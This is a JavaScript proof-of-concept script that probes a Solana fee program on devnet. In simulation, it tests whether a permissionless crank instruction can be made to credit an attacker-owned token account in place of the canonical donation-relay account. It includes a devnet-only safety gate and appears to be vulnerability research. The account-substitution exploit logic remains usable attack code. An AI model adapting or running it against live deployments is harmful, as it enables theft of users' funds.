import fs from "node:fs";
import { BorshCoder } from "@coral-xyz/anchor";
import {
  Connection,
  Keypair,
  PublicKey,
  SystemProgram,
  Transaction,
  TransactionInstruction,
} from "@solana/web3.js";
import {
  ASSOCIATED_TOKEN_PROGRAM_ID,
  NATIVE_MINT,
  TOKEN_PROGRAM_ID,
  createAssociatedTokenAccountIdempotentInstruction,
  getAssociatedTokenAddressSync,
} from "@solana/spl-token";
import bs58 from "bs58";

const RPC = process.env.DEVNET_RPC || "https://api.devnet.solana.com";
const DEVNET_GENESIS = "EtWTRABZaYq6iMfeYKouRu166VU2xqa1wcaWoxPkrZBG";
const PUMP_FEES = new PublicKey("pfeeUxB6jkeY1Hxd7CsFCAjcbHA9rWtchMGdZ6VojVZ");
const FALLBACK_PAYER = new PublicKey("CbNuzY28nDxSX9t29bJWidZeFfzLduZ4rwSmoMh54rkR");

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const emit = (status, extra = {}) => console.log(JSON.stringify({ status, ...extra }, null, 2));
const amount = (data) => data?.length >= 72 ? data.readBigUInt64LE(64) : null;
const dataOf = (entry) => {
  if (!entry?.data) return null;
  return Buffer.from(Array.isArray(entry.data) ? entry.data[0] : entry.data, "base64");
};
const field = (obj, camel, snake) => obj[camel] ?? obj[snake];

async function many(connection, keys) {
  const out = [];
  for (let i = 0; i < keys.length; i += 100) {
    out.push(...await connection.getMultipleAccountsInfo(keys.slice(i, i + 100), "confirmed"));
  }
  return out;
}

function messageKeys(tx) {
  const m = tx.transaction.message;
  if (m.staticAccountKeys) {
    return [
      ...m.staticAccountKeys.map(String),
      ...(tx.meta?.loadedAddresses?.writable ?? []).map(String),
      ...(tx.meta?.loadedAddresses?.readonly ?? []).map(String),
    ];
  }
  return (m.accountKeys ?? []).map((x) => String(x.pubkey ?? x));
}

function compiledInstructions(tx) {
  const m = tx.transaction.message;
  return m.compiledInstructions ?? m.instructions ?? [];
}

function ixData(ix) {
  if (ix.data instanceof Uint8Array || Buffer.isBuffer(ix.data)) return Buffer.from(ix.data);
  if (typeof ix.data === "string") {
    try { return Buffer.from(bs58.decode(ix.data)); } catch { return Buffer.from(ix.data, "base64"); }
  }
  return Buffer.alloc(0);
}

function ixAccounts(ix) {
  return Array.from(ix.accountKeyIndexes ?? ix.accounts ?? []);
}

async function rawSim(serialized, addresses) {
  const r = await fetch(RPC, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({
      jsonrpc: "2.0", id: 1, method: "simulateTransaction",
      params: [serialized.toString("base64"), {
        encoding: "base64",
        commitment: "confirmed",
        sigVerify: false,
        replaceRecentBlockhash: true,
        accounts: { encoding: "base64", addresses: addresses.map(String) },
      }],
    }),
  });
  const j = await r.json();
  if (j.error) throw new Error(`simulate RPC: ${JSON.stringify(j.error)}`);
  return j.result.value;
}

async function historicalCrankAccounts(connection, pda, discriminator) {
  const sigs = await connection.getSignaturesForAddress(pda, { limit: 120 }, "confirmed");
  for (const s of sigs) {
    if (s.err) continue;
    await sleep(45);
    let tx;
    try {
      tx = await connection.getTransaction(s.signature, { commitment: "confirmed", maxSupportedTransactionVersion: 0 });
    } catch { continue; }
    if (!tx) continue;
    const keys = messageKeys(tx);
    for (const ci of compiledInstructions(tx)) {
      const programIndex = ci.programIdIndex;
      if (programIndex === undefined || keys[programIndex] !== PUMP_FEES.toBase58()) continue;
      const d = ixData(ci);
      if (d.length < 8 || !d.subarray(0, 8).equals(discriminator)) continue;
      const indexes = ixAccounts(ci);
      const accounts = indexes.map((i) => new PublicKey(keys[i]));
      if (accounts.length !== 17) continue;
      const logs = tx.meta?.logMessages ?? [];
      if (!logs.some((l) => l.includes("Instruction: CrankDonationFeePda"))) continue;
      return { signature: s.signature, slot: s.slot, blockTime: s.blockTime, accounts };
    }
  }
  return null;
}

function crankIx(discriminator, accounts) {
  const writable = new Set([2, 8, 9, 10, 14, 15, 16]);
  const signer = new Set([2]);
  return new TransactionInstruction({
    programId: PUMP_FEES,
    data: discriminator,
    keys: accounts.map((pubkey, i) => ({ pubkey, isWritable: writable.has(i), isSigner: signer.has(i) })),
  });
}

async function simulateCase(connection, label, discriminator, canonical, sourceAta, attackerAta, replacement = null, withAttackerAtaCreate = false) {
  const accounts = [...canonical];
  accounts[2] = FALLBACK_PAYER;
  if (replacement) accounts[replacement.index] = replacement.pubkey;
  const tx = new Transaction();
  if (withAttackerAtaCreate) {
    tx.add(createAssociatedTokenAccountIdempotentInstruction(
      FALLBACK_PAYER,
      attackerAta,
      replacement.owner,
      canonical[9],
      TOKEN_PROGRAM_ID,
      ASSOCIATED_TOKEN_PROGRAM_ID,
    ));
  }
  tx.add(crankIx(discriminator, accounts));
  tx.feePayer = FALLBACK_PAYER;
  tx.recentBlockhash = (await connection.getLatestBlockhash("confirmed")).blockhash;
  const serialized = tx.serialize({ requireAllSignatures: false, verifySignatures: false });
  const res = await rawSim(serialized, [sourceAta, canonical[16], attackerAta]);
  console.log(`--- ${label} LOGS ---`);
  for (const l of res.logs ?? []) console.log(l);
  console.log(`--- END ${label} ---`);
  const sourceAfter = amount(dataOf(res.accounts?.[0]));
  const canonicalDebouncerAtaAfter = amount(dataOf(res.accounts?.[1]));
  const attackerAfter = amount(dataOf(res.accounts?.[2]));
  return {
    label,
    err: res.err,
    sourceAfter: sourceAfter?.toString() ?? null,
    canonicalDebouncerAtaAfter: canonicalDebouncerAtaAfter?.toString() ?? null,
    attackerAtaAfter: attackerAfter?.toString() ?? null,
    logs: res.logs ?? [],
  };
}

const c = new Connection(RPC, "confirmed");
const genesis = await c.getGenesisHash();
if (genesis !== DEVNET_GENESIS) {
  emit("SAFETY_ABORT_NOT_DEVNET", { genesis });
  process.exit(2);
}
console.log(`SAFETY_GATE devnet genesis verified: ${genesis}`);

const payerInfo = await c.getAccountInfo(FALLBACK_PAYER, "confirmed");
if (!payerInfo || !payerInfo.owner.equals(SystemProgram.programId) || payerInfo.lamports < 5_000_000) {
  emit("INCONCLUSIVE_FALLBACK_PAYER_UNAVAILABLE");
  process.exit(3);
}

const idl = JSON.parse(fs.readFileSync(new URL("../../idl/pump_fees.json", import.meta.url), "utf8"));
const coder = new BorshCoder(idl);
const desc = idl.accounts.find((x) => x.name === "DonationFeePda");
const crank = idl.instructions.find((x) => x.name === "crank_donation_fee_pda");
if (!desc || !crank) throw new Error("DonationFeePda/crank descriptor missing");
const discriminator = Buffer.from(crank.discriminator);

const rows = await c.getProgramAccounts(PUMP_FEES, {
  commitment: "confirmed",
  filters: [{ memcmp: { offset: 0, bytes: bs58.encode(Buffer.from(desc.discriminator)) } }],
});
const decoded = [];
for (const row of rows) {
  try {
    const d = coder.accounts.decode("DonationFeePda", row.account.data);
    const quoteMint = new PublicKey(field(d, "quoteMint", "quote_mint"));
    if (!quoteMint.equals(NATIVE_MINT)) continue;
    const configId = new PublicKey(field(d, "configId", "config_id"));
    const baseMint = new PublicKey(field(d, "baseMint", "base_mint"));
    const ata = getAssociatedTokenAddressSync(quoteMint, row.pubkey, true, TOKEN_PROGRAM_ID);
    decoded.push({ pubkey: row.pubkey, quoteMint, configId, baseMint, ata });
  } catch {}
}
console.log(`DONATION_DISCOVERY total=${rows.length} wsol=${decoded.length}`);
if (!decoded.length) {
  emit("INCONCLUSIVE_NO_DONATION_PDAS");
  process.exit(4);
}

const infos = await many(c, decoded.map((x) => x.ata));
const funded = decoded.map((x, i) => ({ ...x, ataInfo: infos[i], balance: amount(infos[i]?.data) ?? 0n }))
  .filter((x) => x.balance > 0n)
  .sort((a, b) => a.balance === b.balance ? 0 : a.balance > b.balance ? -1 : 1);
console.log("FUNDED_DONATION_PDAS", funded.slice(0, 20).map((x) => ({ pda: x.pubkey.toBase58(), balance: x.balance.toString(), configId: x.configId.toBase58(), baseMint: x.baseMint.toBase58() })));
if (!funded.length) {
  emit("INCONCLUSIVE_NO_FUNDED_DONATION_PDA");
  process.exit(5);
}

let chosen = null;
for (const candidate of funded.slice(0, 14)) {
  const history = await historicalCrankAccounts(c, candidate.pubkey, discriminator);
  if (!history) continue;
  if (!history.accounts[8].equals(candidate.pubkey)) continue;
  chosen = { ...candidate, history };
  break;
}
if (!chosen) {
  emit("INCONCLUSIVE_NO_FUNDED_PDA_WITH_CRANK_HISTORY", { funded: funded.length });
  process.exit(6);
}

console.log(JSON.stringify({
  selectedDonationPda: chosen.pubkey.toBase58(),
  sourceAta: chosen.ata.toBase58(),
  sourceBalance: chosen.balance.toString(),
  configId: chosen.configId.toBase58(),
  baseMint: chosen.baseMint.toBase58(),
  historicalCrank: chosen.history.signature,
  historicalSlot: chosen.history.slot,
  canonicalAccounts: chosen.history.accounts.map((x, i) => `${i}:${x.toBase58()}`),
}, null, 2));

// Sanity-check the documented debouncer PDA invariant against the historical account set.
const [expectedDebouncer] = PublicKey.findProgramAddressSync(
  [Buffer.from("debouncer_v1"), chosen.configId.toBuffer(), chosen.quoteMint.toBuffer()],
  chosen.history.accounts[11],
);
console.log(JSON.stringify({ expectedDebouncer: expectedDebouncer.toBase58(), historicalDebouncer: chosen.history.accounts[15].toBase58(), matches: expectedDebouncer.equals(chosen.history.accounts[15]) }, null, 2));

const attacker = Keypair.generate();
const attackerAta = getAssociatedTokenAddressSync(chosen.quoteMint, attacker.publicKey, false, TOKEN_PROGRAM_ID);
const attackerAtaInfo = await c.getAccountInfo(attackerAta, "confirmed");
const attackerBefore = amount(attackerAtaInfo?.data) ?? 0n;

const baseline = await simulateCase(c, "BASELINE_CANONICAL", discriminator, chosen.history.accounts, chosen.ata, attackerAta);
console.log("BASELINE_RESULT", JSON.stringify(baseline, null, 2));
if (baseline.err !== null) {
  emit("INCONCLUSIVE_BASELINE_CRANK_NOT_CURRENTLY_EXECUTABLE", {
    sourceBalance: chosen.balance.toString(),
    error: baseline.err,
    historicalCrank: chosen.history.signature,
  });
  process.exit(7);
}

const redirected = await simulateCase(
  c,
  "MUTATE_DEBOUNCER_ATA_TO_ATTACKER_ATA",
  discriminator,
  chosen.history.accounts,
  chosen.ata,
  attackerAta,
  { index: 16, pubkey: attackerAta, owner: attacker.publicKey },
  true,
);
console.log("REDIRECT_RESULT", JSON.stringify(redirected, null, 2));

const attackerAfter = redirected.attackerAtaAfter === null ? null : BigInt(redirected.attackerAtaAfter);
if (redirected.err === null && attackerAfter !== null && attackerAfter > attackerBefore) {
  emit("CONFIRMED_DONATION_RELAY_REDIRECTION", {
    proof: "A permissionless Pump Fees crank accepted an attacker-owned ATA in place of the canonical donation-relay debouncer ATA and credited it in simulation.",
    donationPda: chosen.pubkey.toBase58(),
    sourceBalanceBefore: chosen.balance.toString(),
    attacker: attacker.publicKey.toBase58(),
    attackerAta: attackerAta.toBase58(),
    attackerBefore: attackerBefore.toString(),
    attackerAfter: attackerAfter.toString(),
    historicalCrank: chosen.history.signature,
  });
  process.exit(0);
}

const wrongDebouncer = await simulateCase(
  c,
  "MUTATE_DEBOUNCER_TO_UNPRIVILEGED_SYSTEM_WALLET",
  discriminator,
  chosen.history.accounts,
  chosen.ata,
  attackerAta,
  { index: 15, pubkey: FALLBACK_PAYER, owner: attacker.publicKey },
  false,
);
const wrongEpoch = await simulateCase(
  c,
  "MUTATE_EPOCH_TRACKER_TO_UNPRIVILEGED_SYSTEM_WALLET",
  discriminator,
  chosen.history.accounts,
  chosen.ata,
  attackerAta,
  { index: 14, pubkey: FALLBACK_PAYER, owner: attacker.publicKey },
  false,
);
const wrongWhitelist = await simulateCase(
  c,
  "MUTATE_MINT_WHITELIST_TO_UNPRIVILEGED_SYSTEM_WALLET",
  discriminator,
  chosen.history.accounts,
  chosen.ata,
  attackerAta,
  { index: 13, pubkey: FALLBACK_PAYER, owner: attacker.publicKey },
  false,
);

emit("DONATION_RELAY_DIFFERENTIAL_COMPLETE", {
  sourceBalanceBefore: chosen.balance.toString(),
  baselineError: baseline.err,
  debouncerAtaMutationError: redirected.err,
  debouncerMutationError: wrongDebouncer.err,
  epochTrackerMutationError: wrongEpoch.err,
  mintWhitelistMutationError: wrongWhitelist.err,
  attackerAtaAfterRedirect: redirected.attackerAtaAfter,
  note: "A clean account/seed/owner rejection on every mutation kills this cross-program substitution path. A successful mutation without value redirection is only a lower-impact state-confusion lead.",
});
